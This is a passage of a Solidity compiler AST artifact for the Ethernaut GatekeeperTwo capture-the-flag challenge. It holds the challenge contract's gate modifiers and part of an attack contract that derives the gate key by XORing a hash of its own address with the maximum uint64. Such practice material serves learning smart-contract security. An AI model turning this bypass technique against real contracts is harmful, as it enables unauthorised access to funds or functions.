										"id": 16,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "344:2:0"
									},
									"src": "328:146:0",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 62,
										"nodeType": "Block",
										"src": "516:182:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint64",
																"typeString": "uint64"
															},
															"id": 58,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																},
																"id": 51,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"arguments": [
																								{
																									"argumentTypes": null,
																									"expression": {
																										"argumentTypes": null,
																										"id": 41,
																										"name": "msg",
																										"nodeType": "Identifier",
																										"overloadedDeclarations": [],
																										"referencedDeclaration": -15,
																										"src": "588:3:0",
																										"typeDescriptions": {
																											"typeIdentifier": "t_magic_message",
																											"typeString": "msg"
																										}
																									},
																									"id": 42,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"memberName": "sender",
																									"nodeType": "MemberAccess",
																									"referencedDeclaration": null,
																									"src": "588:10:0",
																									"typeDescriptions": {
																										"typeIdentifier": "t_address_payable",
																										"typeString": "address payable"
																									}
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_address_payable",
																										"typeString": "address payable"
																									}
																								],
																								"expression": {
																									"argumentTypes": null,
																									"id": 39,
																									"name": "abi",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": -1,
																									"src": "571:3:0",
																									"typeDescriptions": {
																										"typeIdentifier": "t_magic_abi",
																										"typeString": "abi"
																									}
																								},
																								"id": 40,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"lValueRequested": false,
																								"memberName": "encodePacked",
																								"nodeType": "MemberAccess",
																								"referencedDeclaration": null,
																								"src": "571:16:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_function_abiencodepacked_pure$__$returns$_t_bytes_memory_ptr_$",
																									"typeString": "function () pure returns (bytes memory)"
																								}
																							},
																							"id": 43,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"kind": "functionCall",
																							"lValueRequested": false,
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "571:28:0",
																							"tryCall": false,
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes_memory_ptr",
																								"typeString": "bytes memory"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_bytes_memory_ptr",
																								"typeString": "bytes memory"
																							}
																						],
																						"id": 38,
																						"name": "keccak256",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": -8,
																						"src": "561:9:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																							"typeString": "function (bytes memory) pure returns (bytes32)"
																						}
																					},
																					"id": 44,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"kind": "functionCall",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "561:39:0",
																					"tryCall": false,
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				],
																				"id": 37,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "554:6:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_bytes8_$",
																					"typeString": "type(bytes8)"
																				},
																				"typeName": {
																					"id": 36,
																					"name": "bytes8",
																					"nodeType": "ElementaryTypeName",
																					"src": "554:6:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 45,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "554:47:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes8",
																				"typeString": "bytes8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_bytes8",
																				"typeString": "bytes8"
																			}
																		],
																		"id": 35,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "547:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint64_$",
																			"typeString": "type(uint64)"
																		},
																		"typeName": {
																			"id": 34,
																			"name": "uint64",
																			"nodeType": "ElementaryTypeName",
																			"src": "547:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 46,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "547:55:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint64",
																		"typeString": "uint64"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "^",
																"rightExpression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 49,
																			"name": "_gateKey",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 31,
																			"src": "628:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes8",
																				"typeString": "bytes8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_bytes8",
																				"typeString": "bytes8"
																			}
																		],
																		"id": 48,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "621:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint64_$",
																			"typeString": "type(uint64)"
																		},
																		"typeName": {
																			"id": 47,
																			"name": "uint64",
																			"nodeType": "ElementaryTypeName",
																			"src": "621:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 50,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "621:16:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint64",
																		"typeString": "uint64"
																	}
																},
																"src": "547:90:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																},
																"id": 57,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"hexValue": "30",
																			"id": 54,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "664:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_0_by_1",
																				"typeString": "int_const 0"
																			},
																			"value": "0"
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_rational_0_by_1",
																				"typeString": "int_const 0"
																			}
																		],
																		"id": 53,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "657:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint64_$",
																			"typeString": "type(uint64)"
																		},
																		"typeName": {
																			"id": 52,
																			"name": "uint64",
																			"nodeType": "ElementaryTypeName",
																			"src": "657:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 55,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "657:9:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint64",
																		"typeString": "uint64"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "-",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "31",
																	"id": 56,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "669:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"src": "657:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															},
															"src": "547:123:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 33,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "526:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 59,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "526:154:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 60,
												"nodeType": "ExpressionStatement",
												"src": "526:154:0"
											},
											{
												"id": 61,
												"nodeType": "PlaceholderStatement",
												"src": "690:1:0"
											}
										]
									},
									"documentation": null,
									"id": 63,
									"name": "gateThree",
									"nodeType": "ModifierDefinition",
									"overrides": null,
									"parameters": {
										"id": 32,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 31,
												"mutability": "mutable",
												"name": "_gateKey",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 63,
												"src": "499:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes8",
													"typeString": "bytes8"
												},
												"typeName": {
													"id": 30,
													"name": "bytes8",
													"nodeType": "ElementaryTypeName",
													"src": "499:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes8",
														"typeString": "bytes8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "498:17:0"
									},
									"src": "480:218:0",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 84,
										"nodeType": "Block",
										"src": "838:57:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 80,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 77,
														"name": "entrant",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 3,
														"src": "848:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 78,
															"name": "tx",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": -26,
															"src": "858:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_transaction",
																"typeString": "tx"
															}
														},
														"id": 79,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "origin",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "858:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"src": "848:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 81,
												"nodeType": "ExpressionStatement",
												"src": "848:19:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 82,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "884:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 76,
												"id": 83,
												"nodeType": "Return",
												"src": "877:11:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "3370204e",
									"id": 85,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 68,
											"modifierName": {
												"argumentTypes": null,
												"id": 67,
												"name": "gateOne",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 15,
												"src": "759:7:0",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "759:7:0"
										},
										{
											"arguments": null,
											"id": 70,
											"modifierName": {
												"argumentTypes": null,
												"id": 69,
												"name": "gateTwo",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 29,
												"src": "775:7:0",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "775:7:0"
										},
										{
											"arguments": [
												{
													"argumentTypes": null,
													"id": 72,
													"name": "_gateKey",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 65,
													"src": "801:8:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes8",
														"typeString": "bytes8"
													}
												}
											],
											"id": 73,
											"modifierName": {
												"argumentTypes": null,
												"id": 71,
												"name": "gateThree",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 63,
												"src": "791:9:0",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$_t_bytes8_$",
													"typeString": "modifier (bytes8)"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "791:19:0"
										}
									],
									"name": "enter",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 66,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 65,
												"mutability": "mutable",
												"name": "_gateKey",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 85,
												"src": "719:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes8",
													"typeString": "bytes8"
												},
												"typeName": {
													"id": 64,
													"name": "bytes8",
													"nodeType": "ElementaryTypeName",
													"src": "719:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes8",
														"typeString": "bytes8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "718:17:0"
									},
									"returnParameters": {
										"id": 76,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 75,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 85,
												"src": "828:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 74,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "828:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "827:6:0"
									},
									"scope": 86,
									"src": "704:191:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 87,
							"src": "185:712:0"
						}
					],
					"src": "32:866:0"
				},
				"id": 0
			},
			"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol": {
				"ast": {
					"absolutePath": "practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol",
					"exportedSymbols": {
						"GatekeeperTwoAttack": [
							139
						]
					},
					"id": 140,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 88,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:1"
						},
						{
							"absolutePath": "practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol",
							"file": "./GatekeeperTwo.sol",
							"id": 89,
							"nodeType": "ImportDirective",
							"scope": 140,
							"sourceUnit": 87,
							"src": "57:29:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 139,
							"linearizedBaseContracts": [
								139
							],
							"name": "GatekeeperTwoAttack",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 91,
									"mutability": "mutable",
									"name": "target",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 139,
									"src": "123:20:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_GatekeeperTwo_$86",
										"typeString": "contract GatekeeperTwo"
									},
									"typeName": {
										"contractScope": null,
										"id": 90,
										"name": "GatekeeperTwo",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 86,
										"src": "123:13:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_GatekeeperTwo_$86",
											"typeString": "contract GatekeeperTwo"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"constant": false,
									"functionSelector": "65372147",
									"id": 93,
									"mutability": "mutable",
									"name": "result",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 139,
									"src": "149:18:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bool",
										"typeString": "bool"
									},
									"typeName": {
										"id": 92,
										"name": "bool",
										"nodeType": "ElementaryTypeName",
										"src": "149:4:1",
										"typeDescriptions": {
											"typeIdentifier": "t_bool",
											"typeString": "bool"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 137,
										"nodeType": "Block",
										"src": "211:354:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 102,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 98,
														"name": "target",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 91,
														"src": "221:6:1",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_GatekeeperTwo_$86",
															"typeString": "contract GatekeeperTwo"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 100,
																"name": "_address",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 95,
																"src": "244:8:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"id": 99,
															"name": "GatekeeperTwo",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 86,
															"src": "230:13:1",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_GatekeeperTwo_$86_$",
																"typeString": "type(contract GatekeeperTwo)"
															}
														},
														"id": 101,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "230:23:1",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_GatekeeperTwo_$86",
															"typeString": "contract GatekeeperTwo"
														}
													},
													"src": "221:32:1",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_GatekeeperTwo_$86",
														"typeString": "contract GatekeeperTwo"
													}
												},
												"id": 103,
												"nodeType": "ExpressionStatement",
												"src": "221:32:1"
											},
											{
												"assignments": [
													105
												],
												"declarations": [
													{
														"constant": false,
														"id": 105,
														"mutability": "mutable",
														"name": "gateKey",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 137,
														"src": "326:14:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes8",
															"typeString": "bytes8"
														},
														"typeName": {
															"id": 104,
															"name": "bytes8",
															"nodeType": "ElementaryTypeName",
															"src": "326:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes8",
																"typeString": "bytes8"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 129,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint64",
																"typeString": "uint64"
															},
															"id": 127,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"arguments": [
																							{
																								"argumentTypes": null,
																								"id": 115,
																								"name": "this",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": -28,
																								"src": "404:4:1",
																								"typeDescriptions": {
																									"typeIdentifier": "t_contract$_GatekeeperTwoAttack_$139",
																									"typeString": "contract GatekeeperTwoAttack"
																								}
																							}
																						],
																						"expression": {
																							"argumentTypes": [
																								{
																									"typeIdentifier": "t_contract$_GatekeeperTwoAttack_$139",
																									"typeString": "contract GatekeeperTwoAttack"
																								}
																							],
																							"expression": {
																								"argumentTypes": null,
																								"id": 113,
																								"name": "abi",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": -1,
																								"src": "387:3:1",
																								"typeDescriptions": {
																									"typeIdentifier": "t_magic_abi",
																									"typeString": "abi"
																								}
																							},
																							"id": 114,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"lValueRequested": false,
																							"memberName": "encodePacked",
																							"nodeType": "MemberAccess",
																							"referencedDeclaration": null,
																							"src": "387:16:1",
																							"typeDescriptions": {
																								"typeIdentifier": "t_function_abiencodepacked_pure$__$returns$_t_bytes_memory_ptr_$",
																								"typeString": "function () pure returns (bytes memory)"
																							}
																						},
																						"id": 116,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"kind": "functionCall",
																						"lValueRequested": false,
																						"names": [],
																						"nodeType": "FunctionCall",
																						"src": "387:22:1",
																						"tryCall": false,
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					],
																					"id": 112,
																					"name": "keccak256",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": -8,
																					"src": "377:9:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																						"typeString": "function (bytes memory) pure returns (bytes32)"
																					}
																				},
																				"id": 117,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "377:33:1",
																				"tryCall": false,
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			],
																			"id": 111,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "370:6:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_bytes8_$",
																				"typeString": "type(bytes8)"
																			},
																			"typeName": {
																				"id": 110,
																				"name": "bytes8",
																				"nodeType": "ElementaryTypeName",
																				"src": "370:6:1",
																				"typeDescriptions": {
																					"typeIdentifier": null,
																					"typeString": null
																				}
																			}
																		},
																		"id": 118,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "370:41:1",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes8",
																			"typeString": "bytes8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes8",
																			"typeString": "bytes8"
																		}
																	],
																	"id": 109,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "363:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint64_$",
																		"typeString": "type(uint64)"
																	},
																	"typeName": {
																		"id": 108,
																		"name": "uint64",
																		"nodeType": "ElementaryTypeName",
																		"src": "363:6:1",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 119,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "363:49:1",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "^",
															"rightExpression": {
																"argumentTypes": null,
																"components": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint64",
																			"typeString": "uint64"
																		},
																		"id": 125,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "30",
																					"id": 122,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "423:1:1",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_0_by_1",
																						"typeString": "int_const 0"
																					},
																					"value": "0"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_0_by_1",
																						"typeString": "int_const 0"
																					}
																				],
																				"id": 121,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "416:6:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint64_$",
																					"typeString": "type(uint64)"
																				},
																				"typeName": {
																					"id": 120,
																					"name": "uint64",
																					"nodeType": "ElementaryTypeName",
																					"src": "416:6:1",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 123,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "416:9:1",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint64",
																				"typeString": "uint64"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "-",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "31",
																			"id": 124,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "428:1:1",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_1_by_1",
																				"typeString": "int_const 1"
																			},
																			"value": "1"
																		},
																		"src": "416:13:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint64",
																			"typeString": "uint64"
																		}
																	}
																],
																"id": 126,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "415:15:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															},
															"src": "363:67:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint64",
																"typeString": "uint64"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint64",
																"typeString": "uint64"
															}
														],
														"id": 107,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "343:6:1",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes8_$",
															"typeString": "type(bytes8)"
														},
														"typeName": {
															"id": 106,
															"name": "bytes8",
